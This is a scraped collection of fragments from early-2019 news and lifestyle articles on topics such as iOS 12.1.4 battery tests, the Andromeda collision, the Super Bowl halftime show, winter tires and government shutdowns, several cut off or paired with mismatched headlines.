As a response, the restaurant said in a statement: ""We are very proud of our burgers but we do also understand that Pablo Escobar was a horrible man who destroyed the lives of thousands of Colombians.

""We do not condone, idolise or promote Pablo Emilio Escobar or his actions in anyway. We are however Australian and know how to have a laugh about a good play on words.

""Its just a name of a pop-up burger bar not really a theme. Hard not to offend someone in 2019.""",​Pablo's Escoburgers Owner Will Only Change Restaurant’s Name If Haters Raise $100m For Charity,

Does The iOS 12.1.4 Update Boost The Battery Life Of iPhones?
",13/02/2019 9:56,https://www.valuewalk.com/2019/02/ios-12-1-4-battery-life-test-iphones/,"Apple released iOS 12.1.4 last week, primarily to fix the Group FaceTime bug. We have often seen interim updates increase iPhones’ battery life due to optimizations and other tweaks. However, the opposite can also happen, so the YouTube channel iAppleBytes carried out the iOS 12.1.4 battery life test to find out whether the latest iOS update has affected battery life.

iOS 12.1.4 battery life test shows marginal or no improvement

iAppleBytes conducted the popular Geekbench battery life benchmark test on an iPhone 5s, iPhone 6, iPhone 6s, iPhone 7 and iPhone 8 running on the latest version of iOS. The channel regularly performs this test on the latest version, and whenever the next one is released, it runs the tests again and releases an update.

After performing the iOS 12.1.4 battery life test, iAppleBytes compared the results with those from the iOS 12.1.3 test. Overall, the iOS 12.1.4 battery life test showed a very marginal improvement over the previous version of iOS. The biggest gainer was the iPhone 8, which gained six minutes after updating to iOS 12.1.4. However, that’s not a big gain when you consider how long it takes the entire battery to drain.

Tiger Cubs Start To Struggle As Tech Stocks Slump According to initial reports, some of Wall Street's highest-profile fund managers are suffering significant losses this year as volatile markets unseat their carefully constructed portfolios. Q4 2021 hedge fund letters, conferences and more The so-called Tiger Cubs, hedge funds founded by former employees of Tiger Management, have achieved some of the best track records in Read More

You can see the comparison video in its entirety here:

It makes sense that there would be no improvement or a very marginal one, considering the lack of feature-related changes between the two iOS releases. Speed test videos for iOS 12.1.4 yielded similar results as well, indicating no major changes in the speeds between the two versions.

The speed and battery life tests essentially verify that the iOS 12.1.4 update contains only bug fixes. Apple is expected to release iOS 12.2 later this month or in early March, so hopefully we will see some battery improvements then.

Fixes a few bugs, but triggers more for some

Apple’s iOS 12.1.4 update addresses the Group FaceTime bug, which captured many headlines last week. The issue with FaceTime allowed users to eavesdrop on others even when their call was not answered. In other words, the caller could hear everything on the other line just by calling, even if the receiver had not accepted the call.

Apple was widely criticized for the bug. To ensure that the issue causes no further problems, Apple disabled the feature for everyone at the time. Now the latest update re-enables the feature for all.

“A logic issue existed in the handling of Group FaceTime calls. The issue was addressed with improved state management,” Apple said on its support page.

The latest update also fixed an unidentified vulnerability in FaceTime’s Live Photos feature. Additionally, according to Google’s Project Zero security team, iOS 12.1.4 fixed two zero-day vulnerabilities code-named CVE-2019-7286 and CVE-2019-7287. These vulnerabilities were related to a memory corruption issue.

In addition to those bug fixes, iOS 12.1.4 appears have triggered new issues as well. Some users took to Twitter to complain about a new network connectivity issue. One user said his phone is not accepting any SIM, while another faced issues “connecting to my home Wifi [sic] Network..”

There are other complaints about other issues as well, like degraded performance in the AirPods, voice memos, cellular, Touch ID and more. However, Forbes pointed out that users have been facing similar issues since the iOS 12.1.2 update.

The iOS 12.2 update is expected to be Apple’s first big software change for 2019. The developer beta hints at more Animoji and few front-facing user interface tweaks as well. Specifically, Apple is expected to add four new Animoji: Shark, Giraffe, Owl and Warthog.

Other changes include a slightly-tweaked Control Center. For example, the Screen Mirroring button will no longer be represented by a triangle with a floating rectangular box on top of it. Instead, it will show two rectangles overlapping each other.

Another useful change is related to the Apple TV shortcut button. The button displays a virtual remote which is almost the length of the screen. This addition is helpful if you own an Apple TV box or an AirPlay-2-compatible 4K TV or you don’t have a remote.

There is an update for Apple Maps as well. With iOS 12.2, you will be able to see the air quality index (AQI) for the area you view on Apple Maps. The AQI data was added to the Weather app in iOS 12.0, and now, Apple is integrating it into Maps as well.",Does The iOS 12.1.4 Update Boost The Battery Life Of iPhones?,

“The overall picture is not too different,” says study author Roeland van der Marel of the Space Telescope Science Institute. “But the exact orbital pathways are different.”

Is that good news? It sounds like this collision is still inevitable.

It is inevitable. Andromeda, which is currently 2.5 million light-years away, is hurtling toward the Milky Way at nearly 250,000 miles an hour.

Astronomers have known this since Vesto Slipher first aimed a telescope at Andromeda and measured the galaxy’s motion in 1912. (He didn’t know it was a galaxy at the time, when conventional wisdom suggested it was a nebulous cloud inside the Milky Way. Needless to say, Slipher’s calculations suggested that idea needed revising).

Later, astronomers using the Hubble Space Telescope were able to measure the sideways motion of Andromeda, which determines whether the galaxies are destined for a direct hit or a cosmic brush-pass. Using those observations, in 2012 van der Marel and his team forecast a head-on collision in roughly 3.9 billion years—a prediction they’ve just revised.

“It is interesting, even though it is in some ways a fairly minor modification of what was known previously,” says Brant Robertson of the University of California, Santa Cruz.

What did Gaia do differently from Hubble?

Gaia took a good look at 1,084 of the brightest stars within Andromeda and measured their motions. Then, van der Marel and his team averaged those observations and calculated Andromeda’s rotation rate for the first time, as well as making new calculations of the galaxy’s side-to-side movement.",Our galaxy is due to crash into its neighbor—but when?,

The 3 Types Of People Most Likely To Cheat, According To Experts
",7/02/2019 13:43,https://www.iflscience.com/editors-blog/the-3-types-of-people-most-likely-to-cheat-according-to-love-life-strategist-matthew-hussey/,"Do you — or your partner — fit into one of these categories?Shutterstock/conrado

Infidelity is one of the biggest causes of breakups — and of divorce.

For New York Times best selling author and ""love life strategist"" Matthew Hussey, cheating is ""whatever the two of you have decided is beyond the boundary of what is OK.""

""There can be no one definition of cheating,"" he told Business Insider. ""It's whatever it is to each partner. In an open relationship, this could be that one of you slept with someone and didn’t tell [the other].""

The bad news is that cheating appears to be more common than you may have realised.

A 2015 YouGov survey for The Sun found that one in five British adults had had an affair, while a third said they had thought about it. A quarter admitted to having had two affairs, while 20% had had three or more, and 8% had had five or more affairs.

According to Hussey, though, there are three types of people that are more likely to cheat than others.

1. Narcissists.

""For the narcissist it's all about proving how lovable they are,"" said Hussey. ""It's not enough one person loving them; they want to make sure that everyone loves them.""

""They'll only feel validated when someone else flirts with them, sleeps with them, or kisses them,"" he added.

A study found that narcissism is linked to people feeling less committed overall in ongoing romantic relationships, in part because they like the idea of finding someone better.

2. Insecure people.

""Insecure people are something to be careful of. And I don't mean a basic level of insecurity that we all have, because we all have our own self-doubts and worries about ourselves. But when someone is so deeply insecure that if you don't give them love today, they're going to find it somewhere else — that's dangerous.""

""In any relationship we have to be real,"" Hussey added. ""If someone goes without love for a long time, the propensity to cheat is going to increase. Over a long enough period of time if someone treats you coldly or is distant, anything can happen. But on a short timeline, if somebody is constantly making how much you love them today the condition on whether they'll cheat or not, [this is] also dangerous and it stems from ego.""

3. People who are just plain selfish.

Hussey said ""selfish people who don't have a moral standard when it comes to their relationships"" are the third type most likely to cheat. ""They know if they cheat their partner would hate it or be traumatised by it, but their own selfish needs just take over,"" he said.

""Either they have a different code of ethics in private for themselves — which is just unfair — or they're simply a hypocrite.""

A Gigantic Blob Keeps Washing Up On Hawaii's Coast
",7/02/2019 12:30,https://www.iflscience.com/plants-and-animals/a-gigantic-blob-carcass-keeps-washing-up-on-hawaiis-coast/,"No matter how hard they tried, authorities in Hawaii just couldn't get rid of a giant floating marshmallowy creature that kept washing up on their coastline. Fortunately, since the blob was being so stubborn, it provided scientists with some solid insights into marine life and the local environment.

The gigantic blob is, in fact, the carcass of a 15-meter-long (50-foot) sperm whale that first washed ashore on January 10 along the south coast of O’ahu, close to the Sand Island State Recreation Area near Honolulu. The remains were hauled out 24 kilometers (15 miles) into the open ocean by a jet ski, but quickly washed up again.

A week on, it was then dragged out to around 3.8 kilometers (2.5 miles) from the shore. That was hoped to be the end of the story, until it reappeared on a remote beach along the west coast.

“The agencies involved (DLNR, NOAA), have made the decision to leave the carcass in place, to let nature take its course and to let us learn from this carcass,” David Schofield, Marine Mammal Response Coordinator for the NOAA's National Marine Fisheries Service, said in a news release.

“We continue to ask people not to disturb this carcass, as both state and federal laws could come into play,"" he added. ""Additionally, due to the possible presence of bones and tissues in the nearshore waters, there could be continued shark activity.""

Since this sperm whale stuck around for so long, marine biologists from the University of Hawaii at Mānoa decided to seize the opportunity to study it. Researchers have flocked to the carcass to collect teeth and bones as the body decomposes. A necropsy last week showed that the sperm whale was most likely suffering from disease, although thankfully they discovered no signs of debris in its gut.",A Gigantic Blob Carcass Keeps Washing Up On Hawaii's Coast,

Everyone Said the Same Thing About Maroon 5's Halftime Show

",4/02/2019 9:59,https://twentytwowords.com/everyone-said-thing-maroon-5s-halftime-show/,"The Super Bowl is one of the most watched television events of the year, with dedicated sports fans and newbies alike tuning in. Aside from the actual game, though, one of the most important aspects of the production is the half time show. It’s when one of the biggest artists of the year plays a mini-concert which is broadcast to literally millions of people around the world.

These half time shows have long been a subject of controversy. Sometimes they’re criticised as “too sexy” for a slot intended for family viewing, other times the choice of artist can seem a little suspect. This year the honour went to pop-rock giants, Maroon 5. The band played alongside rap artist (and boyfriend and baby daddy to a certain Jenner) Travis Scott.

Often the half time show divides viewers – but this year, it seems audiences around the world were all saying the same thing about the show.

advertisement

The Super Bowl is one of the biggest sporting events of the year. via Shutterstock It’s the annual championship game of the National Football League in the US, and is so named because of the stadium where it takes place.



advertisement

It’s also one of the biggest TV events. via Shutterstock Since its 1920 inception, the Super Bowl has been watched by large numbers. In 2017, the show drew 111.9 million viewers during its CBS broadcast.



advertisement

Alongside the football, though, there are many other Super Bowl attractions. via Shutterstock The main one being the half time show. This is where one of the biggest pop music artists will play a mini stadium concert, with similar high levels of viewership.



advertisement

The tradition of the Super Bowl half time show dates back to 1967. The show represents a giant link between the more niche events of the sport and wider popular culture, and is credited with turning the Super Bowl into the phenomenon it is today.



advertisement

Legendary acts have graced the stage for the half time show. via Shutterstock Here’s Prince performing at the Super Bowl half time show in 2007 – truly an icon.



advertisement

Name a huge star, and it’s highly likely they’ve been a part of the Super Bowl half time show. For example, Beyonce, who performed in 2013 to universal acclaim – although, is anyone really surprised about that?



advertisement

Katy Perry’s 2015 stint was record breaking. It’s thought to be the most watched musical event ever, and also featured Missy Elliot and some cartoon sharks.



advertisement

Here’s Bruno Mars playing in 2014. So you get the idea – the Super Bowl half time show is a super big deal. It’s not just a regular live TV appearance or concert. It’s a cultural event.



advertisement

The half time show is no stranger to controversy. via Getty Images In 2004, Janet Jackson sang alongside a young Justin Timberlake. Timberlake ended up exposing Jackson’s breast on stage, which caused an absolute uproar with the viewing public.



advertisement

Even more controversial? Timberlake was invited back to perform for the 2017 half time show, while Jackson’s career never fully recovered from the incident.



advertisement

Whatever happens, the half time show is always big news. But what happened this year sort of blew prior years right out of the water – but not for any reasons you may expect.



advertisement

Now let’s get into the background to this year’s controversy. via Shutterstock It all stems back to this man, Colin Kaepernick, and his political activism.



advertisement

Kaepernick rose to fame as an NFL quarterback. But he last played football in 2016. He’s now better known for his political activism, which has an odd connection to the NFL.



advertisement

Kaepernick’s activism revolved around the Black Lives Matter movement. via Shutterstock The movement was a criticism of (and protest against) the way police officers, in particularly, treated black people. It was inspired by a selection of police shootings of unarmed black victims.



advertisement

In solidarity with the black community, Kaepernick refused to stand for the national anthem. via Shutterstock He inspired a lot of controversy for his decision, but stood by it, and was forced to leave the NFL because of it. Kaepernick has become an inspirational figure in the Black Lives Matter movement.



advertisement

The decision to ban Kaepernick hasn’t been without outcry. In fact, it made finding an act to perform at this year’s Super Bowl half time show a struggle. Rihanna was reportedly one of the artists to refuse, out of solidarity with Kaepernick.



advertisement

A band that didn’t refuse? via Shutterstock Maroon 5. The pop-rock five-piece accepted the offer to perform this year, in spite of the political implications of their decision.



advertisement

The band were joined on stage by rapper Travis Scott. Scott is a popular name in the current rap scene, and is also the boyfriend of Kylie Jenner. The two have a baby together, named Stormi, who was born on February 1st, 2018.



advertisement

So it’s safe to say audiences were already somewhat on the back foot. It’s kind of hard to justify performing at an NFL show without questioning their policies surrounding Kaepernick.



advertisement

But we guess, if you put on a good enough show, all is forgiven. Unfortunately, it appears that didn’t happen, either. Judging by the internet’s reaction to Maroon 5 and Scott’s performance, it seems they’ve doubled down on their potentially poor move.



advertisement

Let’s just say, the reception wasn’t fantastic. In fact, overall, the 2019 Super Bowl has been criticised as a bit of a let down – but it’s clear the Maroon 5 performance didn’t help matters.



advertisement

For many, Maroon 5 just don’t have the back catalogue of music. Especially the sort that would be required for such an enormous performance. In fact, their first few songs, from their 2002 debut album Songs About Jane were giving some viewers unwanted middle school flashbacks.



advertisement

The risk of going for a less prolific band may not have paid off. When compared to the canon of other Super Bowl half time performers, Maroon 5 certainly had some daunting shoes to fill, after all.



advertisement

Even celebrities got in on the action. Basketball superstar LeBron James seemed overall just baffled by the shoddy, rough-around-the-edges performance.



advertisement

The performance wasn’t the only thing people weren’t too keen on, though. One particular area of criticism was lead singer Adam Levine’s choice of shirt. Many viewers thought the brown spotted pattern looked a little too familiar.



advertisement

Another hilarious Tweet compared the performance to another well known disaster. The picture, taken from 2017’s ill-fated Fyre Festival, shows a reality that is significantly lower than expectations.



advertisement

It seems nothing could save this show. Not even a Spongbob Squarepants cameo could get viewers back on side. That’s how you know things have gone badly wrong.



advertisement

Aside from the iffy half time show, though, viewers had even more issues. The game itself has been criticised as extremely dull, plus the winners were a team that a large amount of the USA can hardly stand.



advertisement

The show wasn’t without its defenders. via Getty Images Some believed that it was preconceptions about the performance which were the reasons for its poor reception. Many thought it was the bad taste the lack of political activism left in people’s mouths that people found unpleasant, rather than Maroon 5’s performance itself.



advertisement

Either way, it’s pretty unlikely that history will remember the show favourably. It’s likely that their choice to perform may not have been the wisest career move for the band. And as for that choice of sweater vest? Perhaps even worse.

But he's still not the highest-paid player in this year's big game.

CNBC Make It used numbers from sports data website Spotrac to find the 2018-2019 average salary for each player on the Patriots and Los Angeles Rams. The highest-paid player: Rams defensive tackle Aaron Donald, whose average annual salary is a whopping $22.5 million.

By comparison, the second highest-paid player is Rams wide receiver Brandin Cooks, who'll be paid $16.2 million this season. Brady ranks No. 3, with $15 million.

The total amount a player takes in depends on several factors like signing bonuses, performance incentives and endorsement deals, of which, Brady has many. He earned $14 million in endorsements in 2018 and may earn another $5 million in bonuses ""after the Patriots added incentives to his contract ahead of the season start,"" Forbes reports.

For now, at least, Donald, the 2017 and 2018 AP Defensive Player of the Year, has the edge. At the beginning of this season, he signed a $135 million deal to be paid out over the next six years, and that, in combination with his endorsement deals and signing bonus, put him at No. 5 on Forbes' list of highest-paid players. (Brady comes in at No. 8.)

Donald wasn't always an athletic powerhouse, though. In fact, he was ""lazy as a kid,"" he said in an interview with ESPN. That was before his father, Archie, introduced him to weightlifting in a homemade basement gym at age 12. Workout time was 4:45 a.m. every weekday.",This is the highest-paid player in the Super Bowl—and it's not New England Patriots quarterback Tom Brady,

The fall would definentely kill him, so Augusto stepped in and positioned himself to catch the little dog before he hit the ground. However, the impact would be forceful and could danger the good samaritan. Just like a typical hero, Augusto did not think about himself, he was only concerned with saving the dog.





Augusto positioned himself perfectly and was able to catch the little dog, just in time. However, the force sent him to the ground and the dog fell through his arms. However, Mel quickly got to his feet and ran off without a scratch.

“I was on the floor for a few seconds but it was from relief. I think that I was in the right place at the right time. I did what I could, the most I could to help. It was a joint effort with the caretaker who acted quickly to help the dog. It was a happy ending,” Augusto tells DailyMail.

Mel’s owner was not home at the time of the incident, but has since installed a mesh protector on the balcony to prevent him from climbing it.

After his heroic act, Augusto’s rescue has gone viral. He is a hero and being praised around the world for his bravery.

Want to Make Six Figures a Year? Mike Rowe has the Answer.

",29/01/2019 15:50,https://www.cnbc.com/2020/07/07/dirty-jobs-mike-rowes-career-advice-follow-opportunity-not-passion.html,"The idea of following your passion may sound romantic, but it usually doesn't work out the way you think it will, according to ""Dirty Jobs"" host Mike Rowe.

Too many people spend too much time and money chasing their passion when seizing opportunity is a better bet, he says.

""If there was a recurring lesson on 'Dirty Jobs,' it was to understand how many people we featured on that show that looked like they were doing something that should have made them miserable, but were in fact very, very happy in their work. And surprisingly prosperous,"" says Rowe, whose new Discovery Channel limited series, ""Dirty Jobs: Rowe'd Trip,"" premieres Tuesday.

Many people plan their life around finding job satisfaction and often, ""that plan includes borrowing vast sums of money in order to go to a four-year school to get the degree that will allow you to get to the next step as you seek to get the thing that will make you happy,"" he says. (The average student loan debt per borrower is $32,731, according to the U.S. Department of Education.)

""And now they have to go out into the world to try and get hired into their chosen field,"" he says. ""And it doesn't always work out. In fact, it rarely works out.""

""That's part of why we have [over $1.6 trillion dollars in student loans] on the books. I think a lot of people were told that if they borrowed the money to get their degree, then they would wind up with the job that they were passionate about.""

However, ""if you think there's only one job in the country that can possibly satisfy your passion, then you're gonna spend a lot of time looking for that one job as opposed to finding an opportunity.""

And finding opportunity in the job market is key, according to Rowe. He says many people he featured on ""Dirty Jobs"" were actually multimillionaires who achieved success by fulfilling a gap in the market rather doing what they were personally interested in.

""The truth is, [for] most passionate people on ['Dirty Jobs'] anyway, [they] weren't passionate about what they were doing when they started doing it,"" Rowe says.

""They simply...learned a skill that was in demand. Then they got hired applying that skill. Then they figured out how to get really, really good at it. And then they figured out how to love it.""

Rowe isn't the only entrepreneur who rejects the idea of following your passion to determine your career.

""One of the great lies of life is 'follow your passions,'"" because what you're passionate about may not be realistic, billionaire Mark Cuban said in 2018.

""I used to be passionate about being a professional basketball player. Then I realized I had a 7-inch vertical,"" says Cuban. (Top contenders in the 2019 NBA draft all had a max vertical leap over 40 inches.)

Instead, ""evaluate and say, 'Okay, where am I putting in my time?'"" Cuban said. Because ""where you put in your effort, that tends to be the things that you are good at. And if you put in enough time, you tend to get really good at it,"" Cuban said.

It's how Cuban became a tech mogul. When he was young, he was never interested in technology: ""I took one computer class and cheated at it,"" he said in an interview on ABC's ""Shark Tank.""

""But when I got one of my first jobs out of school using technology, it was like, wait, I love this. I've taught myself the program, I could go seven hours, eight hours without taking a break thinking it was 10 minutes because I was concentrating so hard and so excited and really loved it. And that's when I realized that I can be really, really good at technology.""

Such expertise was also in demand. So Cuban started his first business, MicroSolutions, which he sold to CompuServe for $6 million in 1990.

Today, Cuban is worth $4.3 billion.

So Rowe urges young people to ""keep your mind open"" when it comes to finding a career.

""We all want to be engaged. We all want to love whatever it is we do,"" Rowe admits. ""But I don't know that the best way to do that for a 17-year-old person is to try and identify what they think will make them happy and then borrow whatever it takes to go get it.""

Try ""doing what you can to be great"" at a skill that is in demand. ""And then [do] what you can to love it. In the end, you still want to wind up passionate about whatever you're doing. Just a question of the chronology you choose to get there.""

Mom Breaks Down In McDonalds Drive-Thru As 5-Year-Old Autistic
Daughter Says Her First Ever Word

",29/01/2019 14:26,https://www.apost.com/en/blog/mom-breaks-down-in-mcdonalds-drive-thru-as-5-year-old-autistic-daughter-says-her-first-ever-word/16537/,"Mom Breaks Down In McDonalds Drive-Thru As 5-Year-Old Autistic Daughter Says Her First Ever Word

In 2018, Alabama resident Briana Blankenship posted a video on Facebook of her 5-year-old autistic daughter saying her first word ever. In the short but altogether heartfelt video, Briana asks her daughter Taylor to say ""mama"" while at the drive-through, and for the first time, she speaks.

This was such a momentous occasion as little Taylor falls on the autism spectrum and is non-verbal. Before this moment in that random drive-through, Briana had never heard her daughter's voice before, as she had never uttered a single word. Then, without any prompting, Taylor made herself heard from the backseat. Briana was understandably overtaken with emotion, as can be seen in the videos below.

Knowing that this was a very special occasion, Briana grabbed her cell phone and started recording. She knew that her husband, Taylor's father, would want to see and hear this wonderful moment. But first, she had to hope Taylor would repeat her utterance. And luckily, she did. Prompted by Briana, Taylor repeated her first and so far only word: ""Mama.""

In the video, it is clear to see that Briana can barely keep it together when she hears her daughter's voice. Every time she successfully prompts Taylor to speak again, Briana can be heard squealing with joy and excitement. Her happiness is so infectious that Taylor also starts to smile brightly, simply enjoying that she can make her mother so happy.

Briana uploaded the video to Facebook, where she tagged her family. Soon, not only her family but many others had seen the footage that was widely shared across the platform.

When she filmed the now popular clip, Briana's daughter Taylor was five years old. She has non-verbal autism, which means that she does not speak since her brain processes information differently, according to Tech Times.

This factor of Taylor's autism originally made Briana wonder if she would ever hear a word from her daughter. Fortunately, in this case, that time did come. It came in an unlikely place, as Briana and Taylor were in the car sitting in the drive-through at McDonald's.

apost.com

As Briana explained in an interview with WHNT News 19, her daughter's first word came completely unprompted: ""I heard her say it. I whipped around and I'm just like 'did you just say mama?!'""

Taylor had indeed said, ""mama."" Briana's shock was massive and, at first, left her in tears. Once she broke down crying, she couldn't stop for a bit. As she explained in her description of the original Facebook video, she must have made a curious sight to the McDonald's employees and other drivers:

""I am ugly crying in the McDonald's parking lot and the employees probably think I'm crazy. [...] I'm pretty sure I held up the drive thru line but there was no way I wasn't getting proof of this. I can't explain how unbelievably grateful and ecstatic I am right now.""

Her daughter, who had never said a single word and who, according to doctors, might have never talked at all, had called her ""mama."" That moment is undoubtedly etched into Briana's mind forever.

With Taylor's sudden verbal burst, Briana hastened to capture the moment. She grabbed the phone through her tears and just started recording. She wanted proof of what just happened, no matter how long it took.

That first word opens up the hope that maybe, one day, Taylor will gain the ability to talk in complete sentences. She has a long journey ahead of her, but this was the step that made the future a lot brighter.

Non-verbal autism is a special subset of autism that is sadly considered underrepresented in medical research. As a result of this lack, not much is known about the causes, possible treatments, and further ramifications of non-verbal autism. Some studies estimate that between 25% to 50% of all children who are diagnosed with non-verbal autism never learn to speak properly at all. Instead, these children develop the skills to use a few words or utterances, never gaining more mastery of the spoken language.

It is important to note that their lack of verbal language does not mean these children are less intelligent than normal ones. They simply lack one tool of communication other children can make use of.

From Men's Health

Last night at the SAG Awards, Michael B. Jordan joined the small but influential list of men who have rocked a harness on the red carpet for an awards show in 2019. And the actor-who came up big at the festivities when Black Panther won for best cast performance in a movie-wasn't shy about his particular choice of harness. It was bold and bright, covered in watercolor splashes of pink, purple, and yellow, and emblazoned with the iconic Louis Vuitton monogram.

This isn't the first time the harness has made an appearance at a major event this year; Timothée Chalamet wore one in sparkly black at the Golden Globes. And last year, Olympian Adam Rippon wore a leather one under his tux at the Oscars. So, despite the tinge of S&M and the maybe-leather-daddy vibe the accessory carries with it, it's becoming kind of A Thing for black-tie affairs.

As Esquire's own Justin Kirkland wrote earlier this month, ""Queer fashion flexes are your next step, so whip out that harness (with or without the dress shirt) and get your pair of cloven boots because I hope the future is full of leather and glitter.""

But we also can't understate the influence of one designer here: Virgil Abloh. He took the reins of Louis Vuitton's menswear last year, and harnesses featured heavily in his debut spring/summer 2019 collection. No coincidence, then, that both Michael B. Jordan and Timothée Chalamet opted to wear harnesses-or, in the fashion house's parlance, ""mid-layers""-on the red carpet.

Is the harness the next big thing for normal guys? Will your old college buddy opt for one at his wedding? Can you expect your nephew to rock one on prom night? Well, if your college buddy knows the word ""couture"" and your nephew is really into the streetwear-meets-high-fashion scene that catapulted Abloh into the menswear stratosphere... maybe. Or maybe not. But let's remember that Michael B. Jordan did just win a prestigious award while wearing one. Maybe it's all connected.

All-Season Tires: Can They Really Handle Winter Weather?

The question comes up year as the snow starts to fall: Should you put winter...
",29/01/2019 10:16,https://www.popularmechanics.com/cars/how-to/a3111/can-all-season-tires-really-handle-the-snow/,"Back in 1977, Goodyear introduced the Tiempo, the first tire dubbed all-season. The idea was simple and alluring: Instead of dealing with the hassle of switching between snow and summer tires as the seasons change, drivers could use one tire all the time. Sales skyrocketed and other companies quickly followed suit. These days nearly all vehicles sold in the United States are fitted with all-season tires from the factory, and 97.5 percent of replacement-tire sales are the same. But is that such a good idea? Actually, no. It turns out that all-season tires are fine in warmer months, but in the snow, they lack traction compared with dedicated snow tires. And that means that the millions of drivers who make do with all-season tires in the winter months are driving cars that aren't as safe as those shod with tires designed for icy conditions.

We know because we traveled to northern Minnesota, home of some of the nation's harshest conditions, to test the claim of the all-season tire. And since all-wheel drive is rapidly becoming a common option, we also tested the notion that the feature is a suitable substitute for snow tires. Our assumption was that, while AWD improves some aspects of winter performance, it doesn't help a car turn or stop, and the added weight of the mechanical bits can actually be a disadvantage. Common sense and physics suggested this to be true, but nothing proves a point like data. And the best way to gather data on winter-tire performance is to find yourself an icy, snowy proving ground.

Ice Driving

There's something foreboding about traveling to a place so cold it's called the Ice Box, but Baudette, Minn., was the perfect place to run our experiments. The sprawling Automotive Enviro Testing facility there specializes in frigid-weather testing for many large auto manufacturers. With a five-month winter season, the facility can maintain enormous snow and ice surfaces kept within strict tolerances by GPS-controlled tractors towing custom-built ice- and snow-grooming systems—basically the world's largest Zambonis.

To set a level playing field, we brought along two nearly identical four-cylinder Chevy Equinoxes—one optioned with front-wheel drive, the other with AWD. We ran both through a series of tests to measure acceleration, braking, hill-climb and turning ability. The cars were first outfitted with Goodyear all-season tires, then we ran the tests again with Goodyear snow tires. We ran each test numerous times and then averaged the results. To minimize the variables, the same driver performed all the tests, and the traction- and stability-control systems were left on. Data collection was completed with the industry standard VBOX—a GPS and accelerometer-based data logger.

The Bottom Line

In a contest between all-season and winter tires driven on snow and ice, the latter won the day. Although the year-round rubber performed admirably, it's clear in all situations that with either FWD or AWD there's a substantial advantage to having proper rubber under you. The results were especially striking during braking and cornering, when snow tires improved performance by up to 5 percent and 20 percent, respectively.

The New Wild Card: Winter-Biased All-Seasons

Tire Rack

This is a relatively recent offshoot of all-season tire, denoted by the ""3 Peak Mountain Snowflake"" (3PMSF) symbol on the sidewall. Goodyear calls this type of tire All Weather, but that's their trademark—Tire Rack refers to these tires as ""Premium Traction."" Whatever you call them, they're designed to cheat the all-season formula in the direction of winter performance. The 3PMSF ""indicates they deliver at least a minimum level of acceleration traction on medium packed snow,"" says Woody Rogers, director of tire information for Tire Rack. ""We find they work surprisingly well in the snow, but of course cannot equal a true winter tire. Which one is 'best' really depends on what else besides snow traction you place emphasis on.""

We haven't tested this type of all-season, but Tire Rack tested three of the latest tires in this group against a non-3PMSF tire—the Pirelli Cinturato P7 All Season Plus—in northern Sweden to assess traction on snow and ice (a hockey rink was involved). Some of the tires use interesting tricks to extend their winter usefulness—the Goodyear Assurance WeatherReady uses soybean oil in the tread compound to help keep it pliable in the cold—and of them fared surprisingly well for all-season tires. The consensus was that in coming years all-seasons are going to edge closer to winter tires in terms of cold-weather performance. The test concluded that, ""These first movers have set the bar very high, and while they won't replace a set of dedicated winter tires for drivers in the snow belt, they are a viable option for anyone who typically uses all-season tires year-round and is looking for improved traction in inclement weather.""

A Few More Tips

Buying and living with winter tires isn't that much of an inconvenience, but there are some guidelines you should follow:

If you live anywhere north of the Mason-Dixon line, it's probably worthwhile to invest in winter tires.

Make sure you buy four tires; skimping and putting winter tires only on the drive end of the car will result in unpredictable handling and could be dangerous.

If you're looking for a bargain, sometimes there are batches of leftover tires for sale. As with cars, not every tire gets sold the same year it's manufactured—and sometimes not for several years afterward. While these leftover tires might not have the exact level of outright grip as a fresh tire, they carry the same warranty and are perfectly fine for anyone who's not scrutinizing the last hundredth of a G in lateral acceleration. And they can be a great deal.

If you'd rather not remount your tires each season, pick up a separate set of inexpensive steel wheels for permanent winter-tire duty. (This also keeps expensive alloy wheels from getting damaged in harsh, salty winter conditions.)

Swap to winter tires around Thanksgiving and back to all-season or summer tires around Easter—winter tires' softer rubber compounds wear quickly in warmer temperatures.

Store off-season tires in a cool, dry area out of the sun, and consider wrapping them in black plastic bags to reduce oxidation.

Keep in mind that having two sets of tires isn't doubling the expense, it's halving the wear. You'll have twice the number of tires but buy new ones half as often.

Remember, fancy new tires or not, the standard winter driving advice still applies: Slow down, double your following distances, anticipate traffic changes ahead, and give yourself extra time to get where you're going. Good luck out there!

Democrats Just Introduced a Bill to Prevent Future Government
Shutdowns, and the Bill's Name Is (Almost) Perfect

",29/01/2019 8:14,https://www.crfb.org/papers/qa-everything-you-should-know-about-government-shutdowns,"The new fiscal year (FY) will begin on October 1, 2021, and Congress has so far enacted none of the 12 appropriations bills setting discretionary spending levels. Lawmakers have until midnight on the final day of the fiscal year – September 30 – to enact legislation to fund the programs covered by the appropriations process, or the government will shut down. A continuing resolution (CR) to allow lawmakers more time to complete work on spending bills is likely to be considered. A shutdown in FY 2022 would affect all federal activities covered by discretionary appropriations, as opposed to the most recent FY 2019 shutdown that began in late 2018 and extended into early 2019 that affected departments and agencies covered by the seven appropriations bills that Congress had not yet enacted.

What is a government shutdown?

Many federal government agencies and programs rely on annual funding appropriations passed by Congress. Every year, Congress must pass and the President must sign budget legislation for the next fiscal year, consisting of 12 appropriations bills, one for each Appropriations subcommittee. Congress has not yet enacted any of the 12 bills for FY 2022 that make up the discretionary spending budget. In a “shutdown,” federal agencies must discontinue all non-essential discretionary functions until new funding legislation is passed and signed into law. Essential services continue to function, as do mandatory spending programs.

What services are affected in a shutdown and how?

Each federal agency develops its own shutdown plan, following guidance released in previous shutdowns and coordinated by the Office of Management and Budget (OMB). The plan identifies which government activities may not continue until appropriations are restored, requiring furloughs and the halting of many agency activities. Essential services – many of which are related to public safety – continue to operate, with payments covering any obligations incurred only when appropriations are enacted. In prior shutdowns, border protection, in-hospital medical care, air traffic control, law enforcement, and power grid maintenance have been among the services classified as essential, while some legislative and judicial staff have also been largely protected. Mandatory spending not subject to annual appropriations, such as for Social Security, Medicare, and Medicaid, also continues. Other examples of activities that continue are those funded by permanent user fees that are not subject to appropriations, such as immigration services funded by visa fees.

Although many programs are exempt, the public is still likely to feel the impact of a shutdown in a number of ways. For example, in a full shutdown:

Social Security and Medicare : Checks are sent out, but benefit verification as well as card issuance would cease. While unlikely to happen again, during the 1995-1996 shutdown more than 10,000 Medicare applicants were temporarily turned away every day of the shutdown.

